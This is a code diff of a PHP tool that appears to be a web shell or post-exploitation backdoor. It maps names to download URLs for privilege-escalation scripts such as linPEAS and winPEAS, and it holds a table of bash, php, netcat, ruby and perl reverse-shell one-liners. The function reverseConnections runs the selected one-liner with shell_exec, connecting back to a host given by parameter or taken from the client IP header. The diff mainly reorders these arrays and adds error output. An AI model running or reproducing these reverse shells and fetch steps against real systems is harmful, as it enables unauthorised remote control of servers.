@@ -64,10 +64,10 @@ function cloner($repo, $os)
 {
     $repos = array(
 
-        "https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh" => "linux",
-        "https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/winPEAS/winPEASbat/winPEAS.bat" => "WinBAT",
-        "https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASany.exe" => "WinEXEANY",
-        "https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py" => "default"
+        "linux" => "https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh",
+        "WinBAT"=> "https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/winPEAS/winPEASbat/winPEAS.bat",
+        "WinEXEANY" => "https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASany.exe",
+        "default" => "https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py"
 
     );
 
@@ -116,9 +116,10 @@ function showEnv($os)
     }
     return null;
 }
-
 function reverseConnections($methods, $host, $port, $shell)
 {
+    ini_set("display_errors", "1");
+    error_reporting(E_ALL);
     $defaultPort = 1634;
     if (!empty($_SERVER["HTTP_CLIENT_IP"]) && empty($host)){
         $host = $_SERVER["HTTP_cLIENT_IP"];
@@ -137,22 +138,26 @@ function reverseConnections($methods, $host, $port, $shell)
         $port = $defaultPort;
     }
     $comma = array(
-        "bash -i >& /dev/tcp/" . $host . "/" . $port . " 0>&1" => "bash",
-        "php -r '\$sock=fsockopen($host.,$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" => "php",
-        "nc -e " . $shell . " " . $host . " " . $port => "nc",
-        "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " . $host . " " . $port . " >/tmp/f" => "ncS",
-        "ruby -rsocket -e'f=TCPSocket.open(".$host.",".$port.").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" => "ruby",
-        "perl -e 'use Socket;\$i=".$host.";\$p=".$port.";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" => "perl",
+        "bash" => "bash -i >& /dev/tcp/" . $host . "/" . $port . " 0>&1",
+        "php" => "php -r '\$sock=fsockopen($host.,$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+        "nc"  => "nc -e " . $shell . " " . $host . " " . $port,
+        "ncS" => "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " . $host . " " . $port . " >/tmp/f",
+        "ruby" => "ruby -rsocket -e'f=TCPSocket.open(".$host.",".$port.").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
+        "perl" => "perl -e 'use Socket;\$i=".$host.";\$p=".$port.";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
 
 
     );
+    $errorNum = error_get_last();
     if (!empty($methods)) {
-        echo "Attempting to connect back, ensure you have the listener running.";
-        shell_exec($comma[$methods]) || die("Error making the connection......");
+        echo "Attempting to connect back, ensure you have the listener running.\n";
+        echo "using ".$methods."\non: ". $host."\nport: ".$port."\nshell: ".$shell."\n";
+        
+        shell_exec($comma[$methods]) || die("Something went wrong: ->".$errorNum);
     }else{
         $defaultAction = $comma["bash"];
-        echo "You didnt specify a method to use, defaulting to bash.";
-        shell_exec($defaultAction) || die("Error");
+        echo "You didnt specify a method to use, defaulting to bash.\n";
+        echo "\nRhost: ". $host."\nRport: ".$port."\nLshell: ".$shell."\n";
+        shell_exec($defaultAction) || die("\nThere was an error at the connection\n->Error\n".$errorNum);
     }
 }
 
